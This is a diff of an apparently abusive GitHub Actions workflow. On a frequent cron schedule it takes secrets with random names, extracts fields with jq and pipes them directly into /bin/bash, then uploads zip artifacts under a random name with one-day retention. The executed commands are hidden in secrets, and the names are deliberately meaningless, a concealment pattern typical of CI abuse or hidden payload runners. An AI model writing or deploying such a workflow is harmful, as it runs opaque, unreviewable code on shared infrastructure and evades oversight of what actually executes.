@@ -1,10 +1,9 @@
 name: chloeprofiletech
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '7 2/6 * * *'
 
+  schedule:
+    - cron: '34 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: chloeprofiletech
         env:
-          b91311: ${{ secrets.b91311 }}
+          tt358: ${{ secrets.tt358 }}
         run: |
-          echo $b91311 | jq -r .mupwz65 | /bin/bash
-          echo $cndmb9729 | jq -r .iz073 | /bin/bash
-          echo $oy830 | jq -r .vaoz15628 | /bin/bash
-          echo $p8960 | jq -r .fy9599 | /bin/bash
-          echo $td579 | jq -r .gx0540 | /bin/bash
-          echo $jfr76917 | jq -r .hoxf91542 | /bin/bash
-          echo $aqzo02 | jq -r .si036 | /bin/bash
+          printf '%s' "$tt358" | jq -r .irvn26 | /bin/bash
+          echo $aj8770 | jq -r .mecp38 | /bin/bash
+          printf '%s' "$ekj64198" | jq -r .zthy65 | /bin/bash
+          printf '%s' "$nbayk01" | jq -r .wuine07978 | /bin/bash
+          printf '%s' "$qdm069" | jq -r .unhhi08281 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9kqQ3JMb
+          path: "*.zip"
+          retention-days: 1
